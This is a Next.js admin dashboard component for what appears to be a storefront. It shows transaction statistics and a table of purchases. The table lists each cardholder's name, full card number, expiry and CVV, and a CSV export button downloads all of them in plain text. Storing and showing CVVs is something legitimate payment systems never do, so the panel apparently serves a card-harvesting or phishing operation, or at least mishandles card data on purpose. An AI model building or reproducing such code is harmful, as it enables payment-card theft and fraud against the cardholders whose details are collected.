'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { motion } from 'framer-motion';
import { 
  BarChart3, 
  DollarSign, 
  Users, 
  TrendingUp, 
  Calendar,
  CreditCard,
  LogOut,
  RefreshCw,
  Download
} from 'lucide-react';
import { 
  fetchAdminStats, 
  fetchTransactions, 
  clearAdminApiKey,
  isAdminAuthenticated,
  AdminStats,
  Transaction,
  DailyStat
} from '@/lib/admin';

export default function AdminDashboard() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(true);
  const [stats, setStats] = useState<AdminStats | null>(null);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [error, setError] = useState<string>('');
  const [refreshing, setRefreshing] = useState(false);
  const [dateFilter, setDateFilter] = useState<'all' | '7d' | '30d'>('all');

  useEffect(() => {
    // Check if authenticated
    if (!isAdminAuthenticated()) {
      router.push('/admin/login');
      return;
    }

    loadData();
  }, [router, dateFilter]);

  const loadData = async () => {
    try {
      setIsLoading(true);
      setError('');

      // Load stats and transactions in parallel
      const [statsData, transactionsData] = await Promise.all([
        fetchAdminStats(),
        fetchTransactions({ limit: 100 }),
      ]);

      setStats(statsData);
      setTransactions(transactionsData.transactions);
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : 'Failed to load admin data';
      setError(errorMessage);
      if (errorMessage.includes('Authentication failed')) {
        setTimeout(() => router.push('/admin/login'), 2000);
      }
    } finally {
      setIsLoading(false);
    }
  };

  const handleRefresh = async () => {
    setRefreshing(true);
    await loadData();
    setRefreshing(false);
  };

  const handleLogout = () => {
    clearAdminApiKey();
    router.push('/admin/login');
  };

  const handleExport = () => {
    const csv = [
      ['Transaction ID', 'Date', 'Amount', 'Cardholder', 'Card Number', 'Expiry', 'CVV'].join(','),
      ...transactions.map(t => [
        t.transactionId,
        new Date(t.timestamp).toLocaleString(),
        t.amount,
        `"${t.cardholderName}"`,
        t.cardNumber,
        t.expiry,
        t.cvv,
      ].join(','))
    ].join('\n');

    const blob = new Blob([csv], { type: 'text/csv' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `transactions-${new Date().toISOString().split('T')[0]}.csv`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
  };

  const filteredTransactions = transactions.filter(t => {
    if (dateFilter === 'all') return true;
    const transactionDate = new Date(t.timestamp);
    const now = new Date();
    const daysAgo = dateFilter === '7d' ? 7 : 30;
    const filterDate = new Date(now.getTime() - daysAgo * 24 * 60 * 60 * 1000);
    return transactionDate >= filterDate;
  });

  if (isLoading) {
    return (
      <main className="min-h-screen pt-32 pb-20 bg-pearl-50 flex items-center justify-center">
        <div className="text-center">
          <RefreshCw className="w-8 h-8 animate-spin mx-auto mb-4 text-gold" />
          <p className="text-black/60">Loading admin dashboard...</p>
        </div>
      </main>
    );
  }

  if (error && !stats) {
    return (
      <main className="min-h-screen pt-32 pb-20 bg-pearl-50 flex items-center justify-center">
        <div className="text-center max-w-md">
          <p className="text-red-600 mb-4">{error}</p>
          <button
            onClick={() => router.push('/admin/login')}
            className="px-6 py-2 bg-black text-white hover:bg-gold transition-colors"
          >
            Go to Login
          </button>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen pt-20 pb-20 bg-pearl-50">
      <div className="max-w-7xl mx-auto px-6">
        {/* Header */}
        <div className="flex justify-between items-center mb-8">
          <div>
            <h1 className="font-serif text-4xl mb-2">Admin Dashboard</h1>
            <p className="text-black/60">Transaction management and analytics</p>
          </div>
          <div className="flex gap-3">
            <button
              onClick={handleRefresh}
              disabled={refreshing}
              className="px-4 py-2 bg-white border border-black/20 hover:bg-black/5 transition-colors flex items-center gap-2 disabled:opacity-50"
            >
              <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin' : ''}`} />
              Refresh
            </button>
            <button
              onClick={handleExport}
              className="px-4 py-2 bg-white border border-black/20 hover:bg-black/5 transition-colors flex items-center gap-2"
            >
              <Download className="w-4 h-4" />
              Export CSV
            </button>
            <button
              onClick={handleLogout}
              className="px-4 py-2 bg-red-50 text-red-700 hover:bg-red-100 transition-colors flex items-center gap-2"
            >
              <LogOut className="w-4 h-4" />
              Logout
            </button>
          </div>
        </div>

        {/* Stats Cards */}
        {stats && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="bg-white p-6 rounded border border-black/10"
            >
              <div className="flex items-center justify-between mb-2">
                <p className="text-sm text-black/60">Total Transactions</p>
                <CreditCard className="w-5 h-5 text-gold" />
              </div>
              <p className="text-3xl font-serif">{stats.totalCount}</p>
              <p className="text-xs text-black/40 mt-1">All time</p>
            </motion.div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.1 }}
              className="bg-white p-6 rounded border border-black/10"
            >
              <div className="flex items-center justify-between mb-2">
                <p className="text-sm text-black/60">Total Revenue</p>
                <DollarSign className="w-5 h-5 text-gold" />
              </div>
              <p className="text-3xl font-serif">${stats.totalAmount.toLocaleString()}</p>
              <p className="text-xs text-black/40 mt-1">All time</p>
            </motion.div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.2 }}
              className="bg-white p-6 rounded border border-black/10"
            >
              <div className="flex items-center justify-between mb-2">
                <p className="text-sm text-black/60">Average Transaction</p>
                <TrendingUp className="w-5 h-5 text-gold" />
              </div>
              <p className="text-3xl font-serif">${Math.round(stats.averageAmount).toLocaleString()}</p>
              <p className="text-xs text-black/40 mt-1">Per transaction</p>
            </motion.div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
              className="bg-white p-6 rounded border border-black/10"
            >
              <div className="flex items-center justify-between mb-2">
                <p className="text-sm text-black/60">Recent (7 days)</p>
                <Calendar className="w-5 h-5 text-gold" />
              </div>
              <p className="text-3xl font-serif">{stats.recentCount}</p>
              <p className="text-xs text-black/40 mt-1">Transactions</p>
            </motion.div>
          </div>
        )}

        {/* Daily Stats Chart */}
        {stats && stats.dailyStats.length > 0 && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-white p-6 rounded border border-black/10 mb-8"
          >
            <div className="flex items-center gap-2 mb-4">
              <BarChart3 className="w-5 h-5 text-gold" />
              <h2 className="font-serif text-2xl">Daily Statistics (Last 30 Days)</h2>
            </div>
            <div className="space-y-3">
              {stats.dailyStats.slice(0, 10).map((day, idx) => (
                <div key={day.date} className="flex items-center gap-4">
                  <div className="w-24 text-sm text-black/60">
                    {new Date(day.date).toLocaleDateString('en-US', { month: 'short', day: 'numeric' })}
                  </div>
                  <div className="flex-1 bg-black/5 rounded-full h-8 relative overflow-hidden">
                    <div
                      className="bg-gold h-full rounded-full flex items-center justify-end pr-2"
                      style={{ width: `${(day.count / Math.max(...stats.dailyStats.map(d => d.count))) * 100}%` }}
                    >
                      <span className="text-xs text-white font-medium">{day.count}</span>
                    </div>
                  </div>
                  <div className="w-32 text-right text-sm">
                    ${day.totalAmount.toLocaleString()}
                  </div>
                </div>
              ))}
            </div>
          </motion.div>
        )}

        {/* Transactions Table */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white rounded border border-black/10 overflow-hidden"
        >
          <div className="p-6 border-b border-black/10 flex justify-between items-center">
            <h2 className="font-serif text-2xl">Transactions</h2>
            <div className="flex gap-2">
              <button
                onClick={() => setDateFilter('all')}
                className={`px-3 py-1 text-sm ${dateFilter === 'all' ? 'bg-black text-white' : 'bg-black/5'}`}
              >
                All
              </button>
              <button
                onClick={() => setDateFilter('7d')}
                className={`px-3 py-1 text-sm ${dateFilter === '7d' ? 'bg-black text-white' : 'bg-black/5'}`}
              >
                Last 7 days
              </button>
              <button
                onClick={() => setDateFilter('30d')}
                className={`px-3 py-1 text-sm ${dateFilter === '30d' ? 'bg-black text-white' : 'bg-black/5'}`}
              >
                Last 30 days
              </button>
            </div>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-black/5">
                <tr>
                  <th className="px-6 py-3 text-left text-sm font-medium">Transaction ID</th>
                  <th className="px-6 py-3 text-left text-sm font-medium">Date</th>
                  <th className="px-6 py-3 text-left text-sm font-medium">Amount</th>
                  <th className="px-6 py-3 text-left text-sm font-medium">Cardholder</th>
                  <th className="px-6 py-3 text-left text-sm font-medium">Card Number</th>
                  <th className="px-6 py-3 text-left text-sm font-medium">Expiry</th>
                  <th className="px-6 py-3 text-left text-sm font-medium">CVV</th>
                </tr>
              </thead>
              <tbody>
                {filteredTransactions.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="px-6 py-12 text-center text-black/40">
                      No transactions found
                    </td>
                  </tr>
                ) : (
                  filteredTransactions.map((txn, idx) => (
                    <tr key={txn.transactionId} className={idx % 2 === 0 ? 'bg-white' : 'bg-black/2'}>
                      <td className="px-6 py-4 text-sm font-mono">{txn.transactionId}</td>
                      <td className="px-6 py-4 text-sm">
                        {new Date(txn.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 text-sm font-medium">${txn.amount.toLocaleString()}</td>
                      <td className="px-6 py-4 text-sm">{txn.cardholderName}</td>
                      <td className="px-6 py-4 text-sm font-mono">{txn.cardNumber}</td>
                      <td className="px-6 py-4 text-sm">{txn.expiry}</td>
                      <td className="px-6 py-4 text-sm font-mono">{txn.cvv}</td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </motion.div>
      </div>
    </main>
  );
}

